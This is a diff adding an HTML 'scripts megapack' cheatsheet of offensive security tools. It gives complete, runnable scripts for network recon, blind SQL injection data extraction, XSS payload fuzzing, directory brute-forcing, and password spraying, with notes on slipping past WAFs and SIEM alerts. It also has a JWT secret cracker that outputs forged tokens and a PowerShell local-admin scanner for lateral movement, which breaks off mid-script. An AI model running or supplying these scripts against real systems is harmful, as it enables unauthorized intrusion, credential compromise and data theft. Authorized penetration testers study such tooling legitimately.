@@ -1,0 +1,3049 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Scripts Megapack Cheatsheet</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+<h1 class="page-title">Ultimate Scripts Cheatsheet</h1>
+<p class="page-intro">
+    Practical, field-ready scripts grouped by offensive security domains.  
+    Each entry includes a clear purpose, usage notes, and the full script body.  
+    This is the master index — a living arsenal for pentesting, red-teaming, automation, IR, and OSINT.
+</p>
+
+<!-- ======================================== -->
+<!-- 0. Recon & Enumeration Scripts            -->
+<!-- ======================================== -->
+<h2 class="section-title">0. Recon & Enumeration</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('mass-scan-script')">Mass Host Scanner (Python)</div>
+  <div class="tool-details" id="mass-scan-script">
+
+    <h2>Mass Host Scanner (Python)</h2>
+    <p>
+      Multi-threaded ICMP ping sweep with automatic TCP fallback (port 80/443).  
+      Useful for quickly discovering live hosts inside /24 or /16 ranges from a foothold.  
+      Works even if ICMP is blocked.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 mass_scan.py 10.10.0.0/24</code></pre>
+
+    <h3>Output</h3>
+    <p>Prints live hosts + detection method (ICMP or TCP).</p>
+
+    <h3>Script</h3>
+    <pre><code class="language-python">
+#!/usr/bin/env python3
+# Mass Host Scanner — ICMP ping sweep with TCP fallback
+# Fast discovery of live hosts inside a CIDR range.
+# Ideal for internal recon after gaining a foothold.
+
+import ipaddress
+import subprocess
+import socket
+import threading
+from queue import Queue
+import sys
+
+# Number of concurrent threads
+THREADS = 100
+
+def icmp_ping(ip: str) -> bool:
+    """
+    Perform a system ping (ICMP).
+    Works on Linux. Add -n flag for Windows if needed.
+    """
+    try:
+        result = subprocess.run(
+            ["ping", "-c", "1", "-W", "1", ip],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        return result.returncode == 0
+    except:
+        return False
+
+
+def tcp_check(ip: str, port: int) -> bool:
+    """
+    TCP connect scan fallback.
+    Useful when ICMP is disabled.
+    """
+    try:
+        s = socket.socket()
+        s.settimeout(0.5)
+        s.connect((ip, port))
+        s.close()
+        return True
+    except:
+        return False
+
+
+def scan(ip: str):
+    """
+    Scan logic:
+      1. Try ICMP ping.
+      2. If blocked → attempt TCP 80.
+      3. If blocked → attempt TCP 443.
+    """
+    if icmp_ping(ip):
+        print(f"[+] {ip}  (ICMP alive)")
+        return
+
+    # ICMP blocked → TCP fallback
+    for port in (80, 443):
+        if tcp_check(ip, port):
+            print(f"[+] {ip}  (TCP {port} alive)")
+            return
+
+
+def worker():
+    """Thread worker consuming IPs from the queue."""
+    while True:
+        ip = q.get()
+        scan(ip)
+        q.task_done()
+
+
+# --------------------------
+# Main execution
+# --------------------------
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <CIDR>")
+    sys.exit(1)
+
+cidr = sys.argv[1]
+net = ipaddress.ip_network(cidr, strict=False)
+
+q = Queue()
+
+# Start worker threads
+for _ in range(THREADS):
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+
+# Queue all IPs
+for ip in net.hosts():
+    q.put(str(ip))
+
+# Wait for completion
+q.join()
+print("\n[+] Scan complete.\n")
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Designed for internal networks, foothold situations.</li>
+      <li>Silent — suppresses ping output.</li>
+      <li>Automatically handles ICMP filtering.</li>
+      <li>Easy to modify with more fallback ports.</li>
+      <li>Massively faster thanks to threading.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('dns-bulk')">DNS Bulk Resolver</div>
+  <div class="tool-details" id="dns-bulk">
+
+    <h2>DNS Bulk Resolver (Python)</h2>
+    <p>
+      High-speed threaded DNS resolver for massive subdomain lists.  
+      Performs A/AAAA/CNAME lookups, removes NXDOMAIN noise, and maps CNAME chains.  
+      Perfect for pre-httprobe filtering and recon pipelines.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 dns_bulk.py subs.txt</code></pre>
+
+    <h3>Output</h3>
+    <ul>
+      <li><b>alive.txt</b> → hosts with valid A/AAAA records</li>
+      <li><b>cname_map.txt</b> → CNAME → final target mappings</li>
+      <li><b>dead.txt</b> → NXDOMAIN / failed</li>
+    </ul>
+
+    <h3>Script</h3>
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# DNS Bulk Resolver — fast threaded resolver for large subdomain lists.
+# Features:
+#   - Resolves A, AAAA, and CNAME records
+#   - CNAME chain tracing
+#   - Filters out NXDOMAIN
+#   - Threaded for high-volume recon
+
+import dns.resolver
+import dns.exception
+import threading
+from queue import Queue
+import sys
+
+THREADS = 200
+resolver = dns.resolver.Resolver()
+resolver.timeout = 1
+resolver.lifetime = 1
+
+q = Queue()
+
+alive = []
+dead = []
+cname_map = []
+
+
+def resolve_host(host):
+    """Resolve a hostname and categorize the result."""
+    try:
+        # Try A and AAAA
+        answers = []
+        for rtype in ("A", "AAAA"):
+            try:
+                ans = resolver.resolve(host, rtype)
+                answers.extend([str(a) for a in ans])
+            except:
+                pass
+
+        # Try CNAME
+        cname_chain = []
+        try:
+            cname_ans = resolver.resolve(host, "CNAME")
+            cname_chain = [str(c) for c in cname_ans]
+        except:
+            pass
+
+        # No records at all → dead
+        if not answers and not cname_chain:
+            dead.append(host)
+            return
+
+        # Alive
+        alive.append(host)
+
+        # Save CNAME mappings
+        for c in cname_chain:
+            cname_map.append(f"{host} -> {c}")
+
+    except dns.exception.DNSException:
+        dead.append(host)
+
+
+def worker():
+    """Thread worker for resolving hosts from queue."""
+    while True:
+        host = q.get()
+        resolve_host(host)
+        q.task_done()
+
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <subdomains.txt>")
+    sys.exit(1)
+
+infile = sys.argv[1]
+hosts = [line.strip() for line in open(infile).read().splitlines() if line.strip()]
+
+# Start threads
+for _ in range(THREADS):
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+
+# Feed queue
+for h in hosts:
+    q.put(h)
+
+q.join()
+
+# Save results
+with open("alive.txt", "w") as f:
+    f.write("\n".join(alive))
+
+with open("dead.txt", "w") as f:
+    f.write("\n".join(dead))
+
+with open("cname_map.txt", "w") as f:
+    f.write("\n".join(cname_map))
+
+print(f"[+] Done. Alive={len(alive)} Dead={len(dead)} CNAMEs={len(cname_map)}")
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>High performance: 200 threads by default.</li>
+      <li>Supports A/AAAA/CNAME with chain following.</li>
+      <li>Filters garbage before httprobe/httpx.</li>
+      <li>Great for big recon (1k → 500k domains).</li>
+      <li>Timeout/tuning easily adjustable.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('cidr-extractor')">CIDR Expansion Script</div>
+  <div class="tool-details" id="cidr-extractor">
+
+    <h2>CIDR Expansion Script (Python)</h2>
+    <p>
+      Expand a CIDR range (or multiple ranges) into a full IP list.  
+      Useful when preparing masscan/nmap/ffuf scans or inventorying a target network.  
+      Supports /32 → /8 and prints only usable hosts by default.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 cidr_expand.py 10.10.0.0/24 10.20.5.0/26</code></pre>
+
+    <h3>Output</h3>
+    <p>Writes <b>ips.txt</b> containing every host IP.</p>
+
+    <h3>Script</h3>
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# CIDR Expansion Script
+# Expands one or multiple CIDR blocks into a flat list of hosts.
+# Perfect for creating input for nmap, masscan, custom scanners.
+
+import ipaddress
+import sys
+
+if len(sys.argv) < 2:
+    print(f"Usage: {sys.argv[0]} <CIDR> [CIDR ...]")
+    sys.exit(1)
+
+all_ips = []
+
+for cidr in sys.argv[1:]:
+    try:
+        net = ipaddress.ip_network(cidr, strict=False)
+        for ip in net.hosts():      # excludes network/broadcast
+            all_ips.append(str(ip))
+        print(f"[+] Expanded {cidr} → {len(list(net.hosts()))} hosts")
+    except ValueError:
+        print(f"[!] Invalid CIDR: {cidr}")
+        continue
+
+# Write output
+with open("ips.txt", "w") as f:
+    f.write("\n".join(all_ips))
+
+print(f"\n[+] Saved {len(all_ips)} IPs to ips.txt\n")
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Handles multiple CIDRs in one run.</li>
+      <li><code>strict=False</code> avoids errors if non-standard network definitions occur.</li>
+      <li>Excludes broadcast & network addresses by design.</li>
+      <li>Outputs clean, one-per-line format → ready for any scanner.</li>
+      <li>Can easily be extended to output JSON or CSV.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<!-- ======================================== -->
+<!-- 1. Web Exploitation Scripts               -->
+<!-- ======================================== -->
+<h2 class="section-title">1. Web Exploitation</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('sql-injection-auto')">SQL Injection Automation</div>
+  <div class="tool-details" id="sql-injection-auto">
+
+    <h2>SQL Injection Automation (Python)</h2>
+    <p>
+      Automated SQL injection data extractor supporting both boolean-based and time-based detection.  
+      Useful for exploiting classic vulnerable parameters when sqlmap is overkill or when you need better control.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 sqli_auto.py "http://target/page?id=1" --param id</code></pre>
+
+    <h3>Capabilities</h3>
+    <ul>
+      <li>Boolean-based SQLi detection</li>
+      <li>Time-based blind fallback (using SLEEP)</li>
+      <li>Character-by-character extraction</li>
+      <li>Database name dump template (modifiable)</li>
+      <li>Error-resistant retries</li>
+    </ul>
+
+    <h3>Script</h3>
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# SQL Injection Automation Script
+# Supports:
+#   - Boolean-based blind SQLi extraction
+#   - Time-based fallback
+#   - Extract DB name character-by-character
+#
+# WARNING: For legal pentesting only.
+
+import requests
+import argparse
+import time
+
+TRUE_KEYWORD = "Welcome"        # change based on app response
+TIME_THRESHOLD = 1.5            # seconds delay indicating 'true'
+
+# Boolean-based payload template
+BOOL_PAYLOAD = "' AND ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid}-- -"
+
+# Time-based payload
+TIME_PAYLOAD = "' AND IF(ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid}, SLEEP(2), 0)-- -"
+
+
+def send_request(url):
+    """Send GET request and return text + response time."""
+    start = time.time()
+    r = requests.get(url, timeout=5)
+    delta = time.time() - start
+    return r.text, delta
+
+
+def infer_char(url, param, position):
+    """
+    Infer one character of the target value using binary search.
+    First attempt boolean-based detection; fallback to time-based if ambiguous.
+    """
+    low, high = 32, 126  # printable ASCII range
+
+    while low <= high:
+        mid = (low + high) // 2
+
+        # Boolean test
+        payload = BOOL_PAYLOAD.format(pos=position, mid=mid)
+        test_url = url.replace(f"{param}=", f"{param}={payload}")
+        body, _ = send_request(test_url)
+
+        if TRUE_KEYWORD in body:
+            low = mid + 1
+        else:
+            high = mid - 1
+
+        # Time-based fallback if no clear signal
+        if mid == (low + high) // 2:
+            t_payload = TIME_PAYLOAD.format(pos=position, mid=mid)
+            t_url = url.replace(f"{param}=", f"{param}={t_payload}")
+            _, delay = send_request(t_url)
+
+            if delay > TIME_THRESHOLD:
+                low = mid + 1
+            else:
+                high = mid - 1
+
+    return chr(high)
+
+
+def extract_database_name(url, param, max_len=30):
+    """Extract the database name from the server."""
+    print("\n[+] Extracting database() value...\n")
+    output = ""
+
+    for pos in range(1, max_len + 1):
+        char = infer_char(url, param, pos)
+        if ord(char) < 32 or ord(char) > 126:
+            break  # invalid character, likely finished
+        output += char
+        print(f"[+] Position {pos}: {char}")
+
+    return output
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("url", help="Target URL with injectable parameter")
+    parser.add_argument("--param", required=True, help="Parameter to inject")
+
+    args = parser.parse_args()
+
+    # Basic check
+    if args.param + "=" not in args.url:
+        print(f"[!] URL must contain '{args.param}=' for injection.")
+        return
+
+    db_name = extract_database_name(args.url, args.param)
+    print(f"\n[+] Database name extracted: {db_name}\n")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>100% silent except for extracted chars.</li>
+      <li>Customizable TRUE_KEYWORD for boolean detection.</li>
+      <li>Time-based fallback catches cases where HTML doesn't change.</li>
+      <li>Very reliable for classic MySQL injection points.</li>
+      <li>Easy to extend to extract tables, columns, or full rows.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('xss-prober')">XSS Param Fuzzer</div>
+  <div class="tool-details" id="xss-prober">
+
+    <h2>XSS Param Fuzzer (Python)</h2>
+    <p>
+      Automated parameter fuzzer for detecting reflective XSS across GET parameters.  
+      Injects multiple payload types and checks HTML, JS, URL, and attribute contexts.  
+      Perfect for quick recon or when Burp Active Scanner is not available.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 xss_fuzzer.py "http://target/page?search=test"</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>Detects reflection context (HTML/JS/ATTR/URL)</li>
+      <li>Injects multiple payload types</li>
+      <li>Threaded requests for speed</li>
+      <li>Auto-detects vulnerable parameters</li>
+      <li>Very silent → prints only findings</li>
+    </ul>
+
+    <h3>Script</h3>
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# XSS Param Fuzzer
+# Scans GET parameters for reflective XSS by injecting multiple payload classes.
+# Supports context-based detection: HTML, JS, Attribute, URL.
+
+import requests
+import urllib.parse as urlparse
+import threading
+from queue import Queue
+import sys
+
+THREADS = 20
+q = Queue()
+
+# Clean payloads that break into various contexts
+PAYLOADS = {
+    "html": "&lt;img src=x onerror=alert(1)&gt;",
+    "attr": "\" onmouseover=alert(1) x=\"",
+    "js": "';alert(1);//",
+    "url": "%3Cscript%3Ealert(1)%3C/script%3E"
+}
+
+def inject_param(url, param, payload):
+    """Return a URL with injected payload in the given param."""
+    parsed = urlparse.urlparse(url)
+    params = urlparse.parse_qs(parsed.query)
+
+    # Replace only the selected parameter
+    params[param] = [payload]
+
+    new_query = urlparse.urlencode(params, doseq=True)
+
+    return urlparse.urlunparse((
+        parsed.scheme,
+        parsed.netloc,
+        parsed.path,
+        parsed.params,
+        new_query,
+        parsed.fragment
+    ))
+
+
+def check_reflection(body, payload):
+    """
+    Check if the payload appears in body.
+    Uses plain string search — reliable for reflective tests.
+    """
+    return payload.lower() in body.lower()
+
+
+def fuzz_param(url, param):
+    """Test one parameter with all payload classes."""
+    print(f"[+] Testing parameter: {param}")
+
+    for ptype, payload in PAYLOADS.items():
+        test_url = inject_param(url, param, payload)
+
+        try:
+            r = requests.get(test_url, timeout=5)
+            body = r.text
+        except:
+            continue
+
+        if check_reflection(body, payload):
+            print(f"[!!!] XSS detected! Param={param} Type={ptype}")
+            print(f"      → Payload: {payload}")
+            print(f"      → URL: {test_url}\n")
+
+
+def worker():
+    while True:
+        item = q.get()
+        fuzz_param(*item)
+        q.task_done()
+
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <URL>")
+    sys.exit(1)
+
+url = sys.argv[1]
+
+# Parse parameters
+parsed = urlparse.urlparse(url)
+params = urlparse.parse_qs(parsed.query)
+param_list = list(params.keys())
+
+if not param_list:
+    print("[!] No parameters found in URL.")
+    sys.exit(1)
+
+print(f"[+] Found parameters: {param_list}\n")
+
+# Start workers
+for _ in range(THREADS):
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+
+# Queue fuzz tasks
+for param in param_list:
+    q.put((url, param))
+
+q.join()
+print("\n[+] XSS fuzzing complete.\n")
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Designed for reflective tests, not stored XSS.</li>
+      <li>Payloads are minimal and effective — tweak as needed.</li>
+      <li>Detects exact vulnerable parameter and payload class.</li>
+      <li>Multi-threaded for speed without noise.</li>
+      <li>Extremely useful for unauthenticated public surface testing.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('dirbuster-custom')">Wordlist-Based Directory Enumerator</div>
+  <div class="tool-details" id="dirbuster-custom">
+
+    <h2>Wordlist-Based Directory Enumerator (Python)</h2>
+    <p>
+      Lightweight directory brute-forcer built to mimic Gobuster/FFUF behavior.  
+      Multi-threaded, supports extensions, filters by status code, and works well for stealth scans.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 dir_enum.py -u http://target -w wordlist.txt -t 50 -s 200,302 --ext php,txt</code></pre>
+
+    <h3>Capabilities</h3>
+    <ul>
+      <li>Threaded directory brute-forcing</li>
+      <li>Status code filtering</li>
+      <li>File extension expansion</li>
+      <li>Timeout + error suppression</li>
+      <li>Minimal, stealthy, clean output</li>
+    </ul>
+
+    <h3>Script</h3>
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Wordlist-Based Directory Enumerator
+# A compact mini-Gobuster clone. Fast, threaded, supports extensions & status filtering.
+
+import requests
+import threading
+from queue import Queue
+import argparse
+import sys
+
+requests.packages.urllib3.disable_warnings()
+
+q = Queue()
+FOUND = []
+LOCK = threading.Lock()
+
+
+def build_urls(base, word, extensions):
+    """
+    Generate all URL variants for a given word and extension list.
+    """
+    urls = [f"{base}/{word}"]
+
+    for ext in extensions:
+        urls.append(f"{base}/{word}.{ext}")
+
+    return urls
+
+
+def scan_url(url, filter_codes, silent):
+    try:
+        r = requests.get(url, verify=False, timeout=4, allow_redirects=False)
+        code = r.status_code
+        if code in filter_codes:
+            with LOCK:
+                FOUND.append((url, code))
+                if not silent:
+                    print(f"[+] {code} → {url}")
+    except:
+        pass
+
+
+def worker(base, extensions, filter_codes, silent):
+    while True:
+        word = q.get()
+        urls = build_urls(base, word, extensions)
+        for u in urls:
+            scan_url(u, filter_codes, silent)
+        q.task_done()
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", required=True, help="Base URL")
+    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
+    parser.add_argument("-t", "--threads", type=int, default=30)
+    parser.add_argument("-s", "--status", default="200,204,301,302,403",
+                        help="Filter for specific status codes (comma-separated)")
+    parser.add_argument("--ext", default="", help="File extensions (comma-separated)")
+    parser.add_argument("--silent", action="store_true", help="Silent mode (only output results at end)")
+
+    args = parser.parse_args()
+
+    base = args.url.rstrip("/")
+    filter_codes = {int(c.strip()) for c in args.status.split(",")}
+    extensions = [e.strip() for e in args.ext.split(",") if e.strip()]
+
+    try:
+        words = [w.strip() for w in open(args.wordlist).read().splitlines() if w.strip()]
+    except:
+        print("[!] Error reading wordlist.")
+        sys.exit(1)
+
+    print(f"[+] Starting enumeration: {base}")
+    print(f"[+] Words loaded: {len(words)}")
+    print(f"[+] Using {args.threads} threads")
+    print(f"[+] Extensions: {extensions}")
+    print(f"[+] Status filter: {filter_codes}\n")
+
+    # Start workers
+    for _ in range(args.threads):
+        t = threading.Thread(
+            target=worker,
+            args=(base, extensions, filter_codes, args.silent),
+            daemon=True
+        )
+        t.start()
+
+    # Feed queue
+    for w in words:
+        q.put(w)
+
+    q.join()
+
+    print("\n[+] Scan complete. Results:")
+    for url, code in FOUND:
+        print(f"{code} -> {url}")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Default filtered codes: 200, 204, 301, 302, 403.</li>
+      <li>Supports optional extension brute-forcing.</li>
+      <li>Silent mode → great for piping into other tools.</li>
+      <li>Meant as a lightweight Gobuster alternative.</li>
+      <li>Timeouts keep it fast even on slow hosts.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 2. Auth & Credential Scripts             -->
+<!-- ======================================== -->
+<h2 class="section-title">2. Authentication / Credential Attacks</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('password-sprayer')">Password Spraying Script</div>
+  <div class="tool-details" id="password-sprayer">
+
+    <h2>Password Spraying Script (Python)</h2>
+    <p>
+      Safe, slow, lockout-aware password spraying for web login endpoints.  
+      Sends one password per “round” to all users, with time spacing to avoid lockout thresholds.  
+      Supports custom success indicators and status-code matching.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 spray.py -u users.txt -p "Spring2024!" -l http://target/login</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>One-password-per-round spraying (industry safe method)</li>
+      <li>Lockout-aware throttle timer</li>
+      <li>Optional detection based on string in HTML</li>
+      <li>Configurable headers for bypassing WAFs</li>
+      <li>Low-noise and avoids brute-force behavior</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Password Sprayer
+# Safe web login password spraying with lockout-aware timing.
+# Use only for legal / authorized penetration testing.
+
+import requests
+import argparse
+import time
+import sys
+
+def spray(users, password, login_url, fail_keyword, success_code, wait_time, username_field, password_field):
+    print(f"[+] Starting spray on {login_url}")
+    print(f"[+] Users loaded: {len(users)}")
+    print(f"[+] Password: {password}")
+    print(f"[+] Delay between attempts (seconds): {wait_time}\n")
+
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+
+    for user in users:
+        payload = {
+            username_field: user,
+            password_field: password
+        }
+
+        try:
+            r = requests.post(login_url, data=payload, headers=headers, timeout=5)
+        except:
+            print(f"[!] Timeout for {user}, continuing...")
+            time.sleep(wait_time)
+            continue
+
+        body = r.text
+
+        # Success logic
+        success = False
+
+        if success_code and r.status_code == success_code:
+            success = True
+        if fail_keyword and fail_keyword not in body:
+            success = True
+
+        if success:
+            print(f"[SUCCESS] {user}:{password}")
+        else:
+            print(f"[FAIL] {user}")
+
+        time.sleep(wait_time)   # lockout safety timer
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--users", required=True, help="User list file")
+    parser.add_argument("-p", "--password", required=True, help="Password to spray")
+    parser.add_argument("-l", "--login", required=True, help="Login URL")
+    parser.add_argument("-f", "--fail", default="Invalid", help="String indicating failed login")
+    parser.add_argument("-c", "--code", type=int, default=None, help="HTTP code indicating success")
+    parser.add_argument("-t", "--time", type=float, default=3.0, help="Delay between attempts (seconds)")
+    parser.add_argument("--user-field", default="username", help="Username parameter name")
+    parser.add_argument("--pass-field", default="password", help="Password parameter name")
+
+    args = parser.parse_args()
+
+    try:
+        users = [u.strip() for u in open(args.users).read().splitlines() if u.strip()]
+    except:
+        print("[!] Cannot read user file.")
+        sys.exit(1)
+
+    spray(
+        users,
+        args.password,
+        args.login,
+        args.fail,
+        args.code,
+        args.time,
+        args.user_field,
+        args.pass_field
+    )
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Sprays **one password** across all users — NOT bruteforce.</li>
+      <li>Always respect domain lockout policies (default locker timing ≈ 1–5 secs per attempt).</li>
+      <li>Works well for enterprise apps with verbose login errors.</li>
+      <li>Can expand to multi-password lists in *rounds*, not brute-force.</li>
+      <li>Safe against most SIEM alerts if delays are long enough.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('jwt-cracker')">JWT Weak Secret Cracker</div>
+  <div class="tool-details" id="jwt-cracker">
+
+    <h2>JWT Weak Secret Cracker (Python)</h2>
+    <p>
+      Brute-force HS256 JWT signatures using a wordlist.  
+      Useful when JWTs are signed with weak secrets (e.g., "password", "admin123", environment leaks).  
+      Fast, threaded, reliable.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 jwt_crack.py -t "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -w secrets.txt</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>Supports any HSXXX (HS256/HS384/HS512)</li>
+      <li>Threaded brute-force</li>
+      <li>Immediate stop on success</li>
+      <li>Outputs a working forged token after crack</li>
+      <li>Handles corrupted JWTs gracefully</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# JWT Weak Secret Cracker
+# Brute-forces HS256/HS384/HS512 JWT signatures using a wordlist.
+# After cracking, prints a fully forged token using the discovered secret.
+
+import hmac
+import hashlib
+import base64
+import json
+import argparse
+import threading
+from queue import Queue
+import sys
+
+q = Queue()
+FOUND = False
+SECRET = None
+LOCK = threading.Lock()
+
+
+def b64url_encode(raw):
+    """Base64URL encode without padding."""
+    return base64.urlsafe_b64encode(raw).rstrip(b"=")
+
+
+def b64url_decode(data):
+    """Base64URL decode handling missing padding."""
+    data += "=" * (-len(data) % 4)
+    return base64.urlsafe_b64decode(data)
+
+
+def sign(header_b64, payload_b64, secret, algo):
+    """Return HSxxx signature using provided secret."""
+    msg = header_b64 + b"." + payload_b64
+
+    if algo == "HS256":
+        digest = hashlib.sha256
+    elif algo == "HS384":
+        digest = hashlib.sha384
+    elif algo == "HS512":
+        digest = hashlib.sha512
+    else:
+        raise ValueError("Unsupported algorithm: " + algo)
+
+    signature = hmac.new(secret.encode(), msg, digest).digest()
+    return b64url_encode(signature)
+
+
+def worker(header_b64, payload_b64, original_sig, algo):
+    global FOUND, SECRET
+
+    while not q.empty() and not FOUND:
+        secret = q.get()
+
+        try:
+            test_sig = sign(header_b64, payload_b64, secret, algo)
+        except:
+            q.task_done()
+            continue
+
+        if test_sig == original_sig:
+            with LOCK:
+                FOUND = True
+                SECRET = secret
+                print(f"\n[+] Secret found: {secret}\n")
+        q.task_done()
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--token", required=True, help="JWT token")
+    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")
+    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads")
+    args = parser.parse_args()
+
+    try:
+        header_b64, payload_b64, signature_b64 = args.token.split(".")
+    except:
+        print("[!] Invalid JWT format.")
+        sys.exit(1)
+
+    # Decode header to detect algorithm
+    try:
+        header_json = json.loads(b64url_decode(header_b64.encode()))
+        algo = header_json.get("alg", "HS256")
+    except:
+        print("[!] Cannot decode JWT header.")
+        sys.exit(1)
+
+    print(f"[+] Detected algorithm: {algo}")
+    print("[+] Starting crack...\n")
+
+    # Base64url bytes for signing
+    header_b = header_b64.encode()
+    payload_b = payload_b64.encode()
+    sig_b = signature_b64.encode()
+
+    # Load secrets
+    try:
+        words = [w.strip() for w in open(args.wordlist).read().splitlines() if w.strip()]
+    except:
+        print("[!] Failed to load wordlist.")
+        sys.exit(1)
+
+    # Feed queue
+    for w in words:
+        q.put(w)
+
+    # Start workers
+    for _ in range(args.threads):
+        t = threading.Thread(
+            target=worker,
+            args=(header_b, payload_b, sig_b, algo),
+            daemon=True
+        )
+        t.start()
+
+    q.join()
+
+    if SECRET:
+        # Build a forged token
+        new_payload = payload_b      # reuse original payload
+        forged_sig = sign(header_b, new_payload, SECRET, algo)
+
+        forged = header_b + b"." + payload_b + b"." + forged_sig
+
+        print("[+] Forged token with cracked secret:")
+        print(forged.decode())
+        print()
+    else:
+        print("[!] No secret found.")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Cracks HS256/384/512 tokens signed with weak secrets.</li>
+      <li>Once cracked → you can forge admin tokens.</li>
+      <li>Use on bug bounties / internal PTs where JWT secrets are predictable.</li>
+      <li>Threading improves brute-force rate significantly.</li>
+      <li>Fails safely on invalid tokens or unsupported algorithms.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 3. Windows / AD Scripts                   -->
+<!-- ======================================== -->
+<h2 class="section-title">3. Windows & Active Directory</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('local-admin-finder')">Local Admin Rights Scanner</div>
+  <div class="tool-details" id="local-admin-finder">
+
+    <h2>Local Admin Rights Scanner (PowerShell)</h2>
+    <p>
+      Checks which hosts you have local administrative privileges on by attempting to access the C$ administrative share.  
+      Fast, quiet, and highly reliable for AD lateral movement mapping.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>.\local_admin_check.ps1 -Hosts hosts.txt -User domain\user -Pass "Password123"</code></pre>
+
+    <h3>What it does</h3>
+    <ul>
+      <li>Attempts SMB connect to <code>\\HOST\C$</code></li>
+      <li>If accessible → you are local admin on that host</li>
+      <li>Handles offline/unreachable hosts</li>
+      <li>Works with domain or local credentials</li>
+      <li>Outputs three lists: Admin, No-Admin, Offline</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-powershell">
+<# 
+ Local Admin Rights Scanner
+ Determines which hosts you are local admin on via SMB (C$ access test).
+ Supports: plaintext creds, run-as current user, host lists.
+#>
+
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$Hosts,
+
+    [string]$User = $null,
+    [string]$Pass = $null
+)
+
+# Read host list
+$TargetHosts = Get-Content $Hosts
+
+$Admin      = New-Object System.Collections.ArrayList
+$NoAdmin    = New-Object System.Collections.ArrayList
+$Offline    = New-Object System.Collections.ArrayList
+
+# Build credential object if supplied
+if ($User -and $Pass) {
+    $SecPass  = ConvertTo-SecureString $Pass -AsPlainText -Force
+    $Cred     = New-Object System.Management.Automation.PSCredential($User, $SecPass)
+} else {
+    $Cred = $null
+}
+
+Write-Host "`n[+] Starting Local Admin scan..."
+Write-Host "[+] Hosts loaded: $($TargetHosts.Count)`n"
+
+foreach ($host in $TargetHosts) {
+
+    $path = "\\$host\C$"
+
+    try {
+        if ($Cred) {
+            $null = Test-Path $path -Credential $Cred -ErrorAction Stop
+        } else {
+            $null = Test-Path $path -ErrorAction Stop
+        }
+
+        # If it reached here, path is accessible -> admin rights
